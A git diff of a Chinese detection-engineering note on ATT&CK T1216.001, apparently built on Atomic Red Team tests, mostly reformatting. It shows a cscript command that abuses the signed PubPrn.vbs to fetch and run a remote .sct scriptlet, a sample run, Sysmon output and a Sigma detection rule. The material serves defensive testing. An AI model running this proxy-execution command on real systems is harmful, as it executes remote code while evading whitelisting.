@@ -11,9 +11,11 @@
 ## 测试案例
 
 ### 测试1 PubPrn.vbs Signed Script Bypass
+
 执行已签名的PubPrn.vbs脚本，该脚本可以下载和执行任意有效载荷。
 攻击命令，Windows命令行执行即可。
-```
+
+```yml
 cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost "script:#{remote_payload}"
 ```
 
@@ -24,15 +26,20 @@ remote_payload：<https://raw.githubusercontent.com/redcanaryco/atomic-red-team/
 Windows 安全日志、Sysmon日志
 
 ## 测试复现
+
 ### 测试1 PubPrn.vbs Signed Script Bypass
-```
+
+```yml
 C:\Users\Administrator.ZHULI>cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs localhost "script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct"
 ```
 
 注意操作系统语言，语言不同，VBS脚本所在位置不同
+
 ## 测试留痕
+
 Windows Sysmon日志
-```      
+
+```yml
 Process Create: 事件ID 1进程创建
 
 RuleName: technique_id=T1059,technique_name=Command-Line Interface
@@ -99,10 +106,10 @@ logsource:
 detection:
     selection:
         EventID: 1 #sysmon日志，进程创建
-		CommandLine: 
-		      - '*\Printing_Admin_Scripts\*\pubprn.vbs' #进程命令行
-			  - 'https:*'
-			  - '*.sct' 
+        CommandLine: 
+             - '*\Printing_Admin_Scripts\*\pubprn.vbs' #进程命令行
+             - 'https:*'
+             - '*.sct' 
     condition: selection
 level: low
 ```
